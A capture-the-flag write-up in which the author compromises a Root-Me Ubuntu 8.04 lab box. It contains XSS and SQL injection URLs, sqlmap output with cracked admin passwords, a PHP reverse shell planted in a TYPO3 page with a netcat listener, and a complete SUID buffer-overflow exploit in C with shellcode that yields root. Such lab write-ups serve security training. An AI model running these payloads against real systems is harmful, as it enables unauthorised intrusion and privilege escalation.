Ubuntu 8.04 LAMP
time taken: ~ 5 hours

root@kali:~/ctf_shit# nmap -sV -A -O -T5 ctf01.root-me.org

Starting Nmap 7.40 ( https://nmap.org ) at 2017-07-19 21:21 MDT
Nmap scan report for ctf01.root-me.org (212.129.28.18)
Host is up (0.096s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey: 
|   1024 97:c2:94:f7:b8:a7:06:6d:04:e4:cf:b9:e5:35:7f:e9 (DSA)
|_  2048 b4:3f:aa:69:48:90:27:4d:b7:1a:63:de:79:4c:ed:5d (RSA)
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch)
|_http-generator: TYPO3 4.2 CMS
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch
|_http-title: GreenPartner: Index
Device type: general purpose|printer|bridge
Running (JUST GUESSING): QEMU (94%), GNU Hurd (87%), HP embedded (86%), Minolta embedded (86%), NEC embedded (86%), Konica Minolta embedded (85%), Linux (85%), Oracle Virtualbox (85%)
OS CPE: cpe:/a:qemu:qemu cpe:/o:gnu:hurd cpe:/h:konicaminolta:7035 cpe:/o:linux:linux_kernel:2.6.18 cpe:/o:oracle:virtualbox
Aggressive OS guesses: QEMU user mode network gateway (94%), GNU Hurd 0.3 (87%), HP 9100c Digital Sender printer (J3113A) (86%), Minolta Di550 laser printer (86%), NEC SuperScript printer (86%), Konica Minolta 7035 printer (85%), Linux 2.6.18 (CentOS 5, x86_64, SMP) (85%), Oracle Virtualbox (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT     ADDRESS
1   0.29 ms 10.0.2.2
2   0.28 ms ctf01.root-me.org (212.129.28.18)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.83 seconds


TRACEROUTE (using port 80/tcp)
HOP RTT     ADDRESS
1   0.36 ms 10.0.2.2
2   0.61 ms ctf01.root-me.org (212.129.28.18)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.98 seconds

sqlmap shows nothing injectible in index.php?id=1$uid=1...

http://ctf01.root-me.org/index.php?id=4&uid=-1%20or%201=1

gives admin info,

http://ctf01.root-me.org/index.php?id=4&uid=-1%20or%201=0 

does not...

http://ctf01.root-me.org/index.php?id=4&no_cache=0&uid=%3Ch1%3Ehello%3C/h1%3E

--> lets us edit the document with whatever we want, text images, but for some reason not scripts...

http://ctf01.root-me.org/index.php?id=4&no_cache=1&uid=%3CSCRIPT%20SRC=http://xss.rocks/xss.js%3E%3C/SCRIPT%3E

this works, links to a test XSS site

found cookie, also reachable via Tamper Data firefox plugin:

fe_typo_user=4243d7df30731e59cdb7ca237647b21d

useless, moving on:

dirb:

---- Scanning URL: http://ctf01.root-me.org/ ----
+ http://ctf01.root-me.org/cgi-bin/ (CODE:403|SIZE:333)                        
+ http://ctf01.root-me.org/ChangeLog (CODE:200|SIZE:399834)                    
+ http://ctf01.root-me.org/clear (CODE:200|SIZE:46)                            
==> DIRECTORY: http://ctf01.root-me.org/content/                               
==> DIRECTORY: http://ctf01.root-me.org/fileadmin/                             
+ http://ctf01.root-me.org/index (CODE:200|SIZE:3979)                          
+ http://ctf01.root-me.org/index.php (CODE:200|SIZE:3979)                      
+ http://ctf01.root-me.org/LICENSE (CODE:200|SIZE:843)                         
==> DIRECTORY: http://ctf01.root-me.org/misc/                                  
+ http://ctf01.root-me.org/README (CODE:200|SIZE:7695)                         
+ http://ctf01.root-me.org/server-status (CODE:403|SIZE:338)                   
==> DIRECTORY: http://ctf01.root-me.org/t3lib/                                 
==> DIRECTORY: http://ctf01.root-me.org/tt/                                    
==> DIRECTORY: http://ctf01.root-me.org/typo3/                                 
==> DIRECTORY: http://ctf01.root-me.org/typo3conf/                             
==> DIRECTORY: http://ctf01.root-me.org/typo3temp/                             
==> DIRECTORY: http://ctf01.root-me.org/uploads/                               
                                                                               
---- Entering directory: http://ctf01.root-me.org/content/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://ctf01.root-me.org/fileadmin/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://ctf01.root-me.org/misc/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://ctf01.root-me.org/t3lib/ ----
==> DIRECTORY: http://ctf01.root-me.org/t3lib/fonts/                           
+ http://ctf01.root-me.org/t3lib/index (CODE:200|SIZE:149)                     
+ http://ctf01.root-me.org/t3lib/index.html (CODE:200|SIZE:149)                
+ http://ctf01.root-me.org/t3lib/README (CODE:200|SIZE:376)                    
+ http://ctf01.root-me.org/t3lib/thumbs (CODE:200|SIZE:62)                     
                                                                               
---- Entering directory: http://ctf01.root-me.org/tt/ ----
==> DIRECTORY: http://ctf01.root-me.org/tt/admin/                              
+ http://ctf01.root-me.org/tt/config (CODE:200|SIZE:0)                         
==> DIRECTORY: http://ctf01.root-me.org/tt/doc/                                
==> DIRECTORY: http://ctf01.root-me.org/tt/images/                             
+ http://ctf01.root-me.org/tt/include (CODE:200|SIZE:383)                      
+ http://ctf01.root-me.org/tt/index (CODE:302|SIZE:0)                          
+ http://ctf01.root-me.org/tt/index.php (CODE:302|SIZE:0)                      
==> DIRECTORY: http://ctf01.root-me.org/tt/install/                            
==> DIRECTORY: http://ctf01.root-me.org/tt/lib/                                
==> DIRECTORY: http://ctf01.root-me.org/tt/modules/                            
==> DIRECTORY: http://ctf01.root-me.org/tt/plugins/                            
+ http://ctf01.root-me.org/tt/preview (CODE:200|SIZE:0)                        
+ http://ctf01.root-me.org/tt/soap (CODE:302|SIZE:0)                           
+ http://ctf01.root-me.org/tt/stylesheet (CODE:200|SIZE:2535)                  
==> DIRECTORY: http://ctf01.root-me.org/tt/tmp/                                
==> DIRECTORY: http://ctf01.root-me.org/tt/uploads/                            
+ http://ctf01.root-me.org/tt/version (CODE:200|SIZE:0)                        
                                                                               
---- Entering directory: http://ctf01.root-me.org/typo3/ ----
+ http://ctf01.root-me.org/typo3/ajax (CODE:200|SIZE:1036)                     
+ http://ctf01.root-me.org/typo3/backend (CODE:200|SIZE:1036)                  
+ http://ctf01.root-me.org/typo3/browser (CODE:200|SIZE:1036)                  
==> DIRECTORY: http://ctf01.root-me.org/typo3/classes/                         
+ http://ctf01.root-me.org/typo3/clear (CODE:200|SIZE:46)                      
+ http://ctf01.root-me.org/typo3/close (CODE:200|SIZE:730)                     
==> DIRECTORY: http://ctf01.root-me.org/typo3/contrib/                         
==> DIRECTORY: http://ctf01.root-me.org/typo3/css/                             
+ http://ctf01.root-me.org/typo3/default (CODE:200|SIZE:299)                   
                                                                                                                                                                                                                                                                                                                                + http://ctf01.root-me.org/typo3/dummy (CODE:200|SIZE:1036)                    
==> DIRECTORY: http://ctf01.root-me.org/typo3/ext/                             
==> DIRECTORY: http://ctf01.root-me.org/typo3/gfx/                             
+ http://ctf01.root-me.org/typo3/index (CODE:200|SIZE:297)                     
+ http://ctf01.root-me.org/typo3/index.htm (CODE:200|SIZE:297)                 
+ http://ctf01.root-me.org/typo3/index.html (CODE:200|SIZE:298)                
+ http://ctf01.root-me.org/typo3/index.php (CODE:200|SIZE:5896)                
+ http://ctf01.root-me.org/typo3/init (CODE:200|SIZE:1036)                     
==> DIRECTORY: http://ctf01.root-me.org/typo3/install/                         
==> DIRECTORY: http://ctf01.root-me.org/typo3/js/                              
+ http://ctf01.root-me.org/typo3/LICENSE (CODE:200|SIZE:459)                   
+ http://ctf01.root-me.org/typo3/logout (CODE:200|SIZE:1036)                   
==> DIRECTORY: http://ctf01.root-me.org/typo3/mod/                             
+ http://ctf01.root-me.org/typo3/README (CODE:200|SIZE:459)                    
+ http://ctf01.root-me.org/typo3/stylesheet (CODE:200|SIZE:46579)              
+ http://ctf01.root-me.org/typo3/template (CODE:200|SIZE:33)                   
==> DIRECTORY: http://ctf01.root-me.org/typo3/templates/                       
+ http://ctf01.root-me.org/typo3/thumbs (CODE:200|SIZE:62)                     
                                                                               
---- Entering directory: http://ctf01.root-me.org/typo3conf/ ----
==> DIRECTORY: http://ctf01.root-me.org/typo3conf/ext/                         
+ http://ctf01.root-me.org/typo3conf/index (CODE:200|SIZE:149)                 
+ http://ctf01.root-me.org/typo3conf/index.html (CODE:200|SIZE:149)            
                                                                               
---- Entering directory: http://ctf01.root-me.org/typo3temp/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://ctf01.root-me.org/uploads/ ----
+ http://ctf01.root-me.org/uploads/index (CODE:200|SIZE:149)                   
+ http://ctf01.root-me.org/uploads/index.html (CODE:200|SIZE:149)              
^C> Testing: http://ctf01.root-me.org/uploads/m6_edit_item 

a lot of these seem to redirect to the homepage

http://ctf01.root-me.org/ChangeLog --> changelog which discloses emails/usernames, bug/vuln fixes,
and typo3 version (4.2.14)

http://ctf01.root-me.org/fileadmin/ --> shows user uploads and a temp folder.
this could be where a web shell is placed...

http://ctf01.root-me.org/misc/ --> or here. has "superadmin.php", which seems to do nothing yet


http://ctf01.root-me.org/typo3temp/
allows for sessions to be accessed...
66b8473be4fcdcad02ceaa34af3f0b97
	fe_typo_user=2c7981748a906af310d56a1b99d1a62a; PHPSESSID=109371b9c25dc922046c212314be3337; 		CMSSESSIDf3a5a9b2=5c34947c750f006bd8219c6a46cb4709;
	be_typo_user=4eed6371b5d1f2ccd2105bf8e3ddd105

f9bbdf493fee037226bf781242345de0
	fe_typo_user=d65f978c4d27a01b9f91919405dd5744; PHPSESSID=109371b9c25dc922046c212314be3337; 		CMSSESSIDf3a5a9b2=5c34947c750f006bd8219c6a46cb4709; 				be_typo_user=03cdb03b2449afbe199af9b082d9ada9
redirects to current session though

http://ctf01.root-me.org/tt/install/ --> CMS made simple install

uploading arbitrary file discloses webapp file structure on host:  /var/www/website/tt/ 

going through the install shows a bunch of data:

Server Software 	Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch
Server API 	apache2handler
Server Operating System 	Linux 2.6.24-26-generic On i686
Apache Mod Security 	Off 

vmsplice may be useful for privesc later on once we have a shell

-----------------------------45589136819429685211852077613\r\nContent-Disposition: form-data; name="cksumdat"; filename=""\r\nContent-Type: application/octet-stream\r\n\r\n\r\n-----------------------------45589136819429685211852077613\r\nContent-Disposition: form-data; name="page"\r\n\r\n2\r\n-----------------------------45589136819429685211852077613\r\nContent-Disposition: form-data; name="default_cms_lang"\r\n\r\nen_US\r\n-----------------------------45589136819429685211852077613--\r\n
	

http://ctf01.root-me.org/tt/admin/	
Database Connection Failed
Error: Access denied for user 'cms'@'localhost' (using password: YES) (1045)
Function Performed: CONNECT
Host/DB: localhost/cms
Database Type: mysql

hmmm...

so database is called cms and is mysql

bypassed check by changing page in Tamper data to 3!

chaned file permissions to 755

page 4 lets us make admin credentials!! 

I set username to admin
email: admin@nowhere.org
password:admin
page 5:
site name: cmssite

don't know mysql admin creds..shit
neither is the admin pannel found on the server...maybe wview-source:http://ctf01.root-me.org/typo3/index.phpe're not supposed to get in this way

http://ctf01.root-me.org/typo3/sysext/cms/ext_tables.sql -- looks important

http://ctf01.root-me.org/typo3conf/ext/page_php_content/doc/wizard_form.html --> oooooo
apparently the authors name is "Gary", email at gniemcew@yahoo.com


http://ctf01.root-me.org/typo3/index.php --> admin login for typo3 cms.

page shows:
The Install Tool is locked.


Fix: Create a file typo3conf/ENABLE_INSTALL_TOOL
This file may simply be empty.

For security reasons, it is highly recommended to rename
or delete the file after the operation is finished.

If the file is older than 1 hour TYPO3 has automatically
deleted it, so it needs to be created again.

no way I can change that file unless I can get to the directory...

ok let's try again


http://ctf01.root-me.org/typo3/sysext/cms/web_info/class.tx_cms_webinfo.php --> file inclusion 
error?
http://ctf01.root-me.org/typo3/sysext/felogin/pi1/class.tx_felogin_pi1.php --> ditto

cannot access http://ctf01.root-me.org/typo3conf/, even with tamper data



SQLMAP TIME:

playing with the URL lead to a viable sql injection. A friend suggested adding "uid" param:

root@kdog:~/ctf_shit/ubuntu_8.04# sqlmap -u 'http://ctf01.root-me.org/index.php?id=4&uid=-1%20OR%2017-7%3d10' --dbs --dump

[02:43:49] [INFO] analyzing table dump for possible password hashes                                               
[02:43:49] [INFO] recognized possible password hashes in column 'password'
[02:43:49] [INFO] writing hashes to a temporary file '/tmp/sqlmaprTpU_99531/sqlmaphashes-W0rTRZ.txt' 
do you want to crack them via a dictionary-based attack? [Y/n/q] y
[02:43:52] [INFO] using hash method 'md5_generic_passwd'
[02:43:52] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[02:43:54] [INFO] cracked password 'bhunji' for user 'admin'                                                      
[02:43:56] [INFO] cracked password 'member1' for user 'member1'                                                   
[02:44:00] [INFO] cracked password 'member2' for user 'member2'


so admin creds for typo3 CMS:
admin:bhunji

wew

after a LONG time, I figured out that a shell can be uploaded by altering the php
code in one of the existing pages (Members), as it contains executable php code.
replacing it with the oh so reliable php-reverse-shell did the trick.
this took a while as there are some restrictions on file type, PHP code is 
not allowed to be uploaded by itself it seems.

so go to Page --> Members --> PHP Script and replace php with php-reverse-shell.php
this CMS is revolting to look at.

have listener waiting upon page inspection:

root@kdog:~# nc -nvlp 32928
listening on [any] 32928 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.2] 47885
Linux victime-laptop 2.6.24-26-generic #1 SMP Tue Dec 1 18:37:31 UTC 2009 i686 GNU/Linux
 11:06:00 up  1:55,  0 users,  load average: 0.16, 0.34, 0.39
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

s h e l l e d


full nelson, half nelson, udev.sh, and vmsplice do not work fuuuuuu almost there 


$ find / -perm -u=s -type f 2>/dev/null --> finds stuff owned by root
/lib/dhcp3-client/call-dhclient-script
/var/www/weak_suid/weak <--- AHA
/var/run/system-tools-backends.pid
/passwd
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
/usr/sbin/pppd
/usr/sbin/uuidd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/apache2/suexec
/usr/lib/policykit/polkit-grant-helper-pam
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/pt_chown
/usr/bin/sudoedit
/usr/bin/lppasswd
/usr/bin/newgrp
/usr/bin/mtr
/usr/bin/pulseaudio
/usr/bin/sudo
/usr/bin/arping
/usr/bin/traceroute6.iputils
/usr/bin/X
/usr/bin/passwd
/usr/bin/at
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/chfn


$ ./get_env
USAGE : ./get_env [env_variable] [program_name]$ cat weak.c
#include <stdio.h>
#include <string.h>

int main (int argc, char** argv){
	char buffer[32];

	if (argc < 2){
		printf("USAGE : %s [message]\n",argv[0]);
		return 1;
	}
	strcpy(buffer,argv[1]);
	printf("You've said : %s\n",buffer);
	return 0;
}


$ cat get_env.c
#include "stdio.h"
#include "stdlib.h"
#include "string.h"


int main (int argc, char** argv){
	char* ptr;
	if (argc < 3 ){
		printf("USAGE : %s [env_variable] [program_name]",argv[0]);
		exit(1);
	}
	ptr=getenv(argv[1]);
	ptr+=(strlen(argv[0]) - strlen(argv[2]))*2;
	printf("%s will be at %p", argv[1], ptr);
	exit(0);
}


$

ok so buffer overflow is probably what is neded
I really hope this isnt trolling in that address randomization has been turned off...
this is probably why this VM is 32 bit

going to need gdb. first find byte order of system:

$ python -c "import sys;print(0 if sys.byteorder=='big' else 1)"
1
$

ok so system is little endian


$ gdb ./weak
GNU gdb 6.8-debian
Copyright (C) 2008 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu"...
(gdb) disas main
Dump of assembler code for function main:
0x0804837c <main+0>:	push   %ebp
0x0804837d <main+1>:	mov    %esp,%ebp
0x0804837f <main+3>:	sub    $0x48,%esp
0x08048382 <main+6>:	and    $0xfffffff0,%esp
0x08048385 <main+9>:	mov    $0x0,%eax
0x0804838a <main+14>:	add    $0xf,%eax
0x0804838d <main+17>:	add    $0xf,%eax
0x08048390 <main+20>:	shr    $0x4,%eax
0x08048393 <main+23>:	shl    $0x4,%eax
0x08048396 <main+26>:	sub    %eax,%esp
0x08048398 <main+28>:	cmpl   $0x1,0x8(%ebp)
0x0804839c <main+32>:	jg     0x80483bc <main+64>
0x0804839e <main+34>:	mov    0xc(%ebp),%eax
0x080483a1 <main+37>:	mov    (%eax),%eax
0x080483a3 <main+39>:	mov    %eax,0x4(%esp)
0x080483a7 <main+43>:	movl   $0x80484bc,(%esp)
0x080483ae <main+50>:	call   0x80482ec <printf@plt>
0x080483b3 <main+55>:	movl   $0x1,-0x2c(%ebp)
0x080483ba <main+62>:	jmp    0x80483ed <main+113>
0x080483bc <main+64>:	mov    0xc(%ebp),%eax
0x080483bf <main+67>:	add    $0x4,%eax
0x080483c2 <main+70>:	mov    (%eax),%eax
0x080483c4 <main+72>:	mov    %eax,0x4(%esp)
0x080483c8 <main+76>:	lea    -0x28(%ebp),%eax
0x080483cb <main+79>:	mov    %eax,(%esp)
0x080483ce <main+82>:	call   0x80482dc <strcpy@plt>
0x080483d3 <main+87>:	lea    -0x28(%ebp),%eax
0x080483d6 <main+90>:	mov    %eax,0x4(%esp)
0x080483da <main+94>:	movl   $0x80484d2,(%esp)
0x080483e1 <main+101>:	call   0x80482ec <printf@plt>
0x080483e6 <main+106>:	movl   $0x0,-0x2c(%ebp)
0x080483ed <main+113>:	mov    -0x2c(%ebp),%eax
0x080483f0 <main+116>:	leave  
0x080483f1 <main+117>:	ret    
End of assembler dump.
(gdb) break *0x080483d6
Breakpoint 1 at 0x80483d6
(gdb) run $(python -c "print('A'*32)")            
Starting program: /var/www/weak_suid/weak $(python -c "print('A'*32)")


(gdb) run  $(python -c "print('A'*32)")
The program being debugged has been started already.
Start it from the beginning? (y or n) [answered Y; input not from terminal]
Starting program: /var/www/weak_suid/weak $(python -c "print('A'*32)")

Breakpoint 1, 0x080483da in main ()
(gdb) x/200xb $esp
0xbffffd40:	0x70	0xfd	0xff	0xbf	0x70	0xfd	0xff	0xbf
0xbffffd48:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0xbffffd50:	0x00	0x00	0x00	0x00	0x01	0x00	0x00	0x00
0xbffffd58:	0xf6	0xfe	0xff	0xbf	0x4e	0xf2	0xee	0xb7
0xbffffd60:	0x19	0x4c	0xf9	0xb7	0xc8	0x95	0x04	0x08
0xbffffd68:	0x78	0xfd	0xff	0xbf	0xa8	0x82	0x04	0x08
0xbffffd70:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0xbffffd78:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0xbffffd80:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0xbffffd88:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0xbffffd90:	0x00	0xec	0xff	0xb7	0x10	0x84	0x04	0x08
0xbffffd98:	0xf8	0xfd	0xff	0xbf	0x50	0xc4	0xe9	0xb7
0xbffffda0:	0x02	0x00	0x00	0x00	0x24	0xfe	0xff	0xbf
0xbffffda8:	0x30	0xfe	0xff	0xbf	0x38	0x2b	0xfe	0xb7
0xbffffdb0:	0x00	0x00	0x00	0x00	0x01	0x00	0x00	0x00
0xbffffdb8:	0x00	0x00	0x00	0x00	0x0b	0x82	0x04	0x08
0xbffffdc0:	0xf4	0x0f	0xfd	0xb7	0xe0	0xec	0xff	0xb7
0xbffffdc8:	0x00	0x00	0x00	0x00	0xf8	0xfd	0xff	0xbf
0xbffffdd0:	0x86	0x40	0x5b	0x17	0x96	0x2a	0x28	0x3b
0xbffffdd8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0xbffffde0:	0x00	0x00	0x00	0x00	0x80	0x6c	0xff	0xb7
0xbffffde8:	0x7d	0xc3	0xe9	0xb7	0xf4	0xef	0xff	0xb7
0xbffffdf0:	0x02	0x00	0x00	0x00	0x00	0x83	0x04	0x08
0xbffffdf8:	0x00	0x00	0x00	0x00	0x21	0x83	0x04	0x08
0xbffffe00:	0x7c	0x83	0x04	0x08	0x02	0x00	0x00	0x00
(gdb) 

STARTING ADDRESS OF BUFFER: 0xbffffd70

clear breaks/exit gdb

(gdb) run $(python -c "print('A'*48)")
Starting program: /var/www/weak_suid/weak $(python -c "print('A'*48)")

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()

GOT IT. memory address starts at 48. A's have overwritten buffer

shell: "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"

remember buffer address is 0xbffffd70

46 byte shellcode
remove some bits to add address of buffer in little endian format

(gdb) run $(python -c "print('\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'+'\x07\xfd\xff\xfb')")

The program being debugged has been started already.
Start it from the beginning? (y or n) [answered Y; input not from terminal]
Starting program: /var/www/weak_suid/weak $(python -c "print('\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'+'\x07\xfd\xff\xfb')")
You've said : �̀�[1��C��C
                         �
                          ��S
                             �����/bin/sh���

Program exited normally.
(gdb)quit
$

adding one more byte causes a segfault. 

trying to expand the buffer does not work...maybe the buffer in weak.c is too small to hold the 
shellcode :(

this must be why we are given get_env.c. the buffer may only need to hold a return address to some
UNIX environment variable?

we could retry the above after loading our shellcode into some env. variable, but 
there may be a more elegant way...

on a second look at get_env.c, the code looks familar...

turns out it came from a book that I own called Hacking: The Art of Exploitation (2nd edition)

a brief thumb through the book took me to some code that I think may work. 
I edited the code to the following:

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char shellcode[] = 
"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"
"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89"
"\xe1\xcd\x80";

int main(int argc, char *argv[]){
   char *env[2] = {shellcode, 0};
   unsigned int i, ret;

   char *buffer = (char *) malloc(160);

   ret = 0xbffffffa - (sizeof(shellcode)-1) - strlen("./weak");

   for(i=0; i < 160; i+=4)
      *((unsigned int *)(buffer+i)) = ret;

   execle("./weak", "weak", buffer, 0, env);
   free(buffer);
}


basically the way this code works is that an "environment variable" (not really, just a C var that 
will be used later as a real environment variable) is set to contain some 
shellcode. 
the program then creates a character buffer of length 160. 
a return address is calculated using the address 0xbffffffa, minus the length of the buffer, minus
the length of the program name "weak".
this return address will contain the address of the "environment variable", which contains the 
shellcode.
the buffer is then filled with this address, repeated enough times to overwrite the return address 
of weak.c
execle() then executes weak.c in the environment specified, which is our shellcode.
weak.c is owned and compiled by root, so anything that happens in weak.c will be of root 
permissions.
I thought to use this as get_env.c predicts the address of an environment variable:

$ ./get_env SHELL weak
SHELL will be at 0xa


so:

$ gcc -o exp exp.c
exp.c:24:2: warning: no newline at end of file
$ ./exp
python -c 'import pty; pty.spawn("/bin/bash")'
bash-3.2# id
id
uid=0(root) gid=33(www-data) groups=33(www-data)
bash-3.2# 


BOOM!!! also turns out password for "test" user ssh is test lol



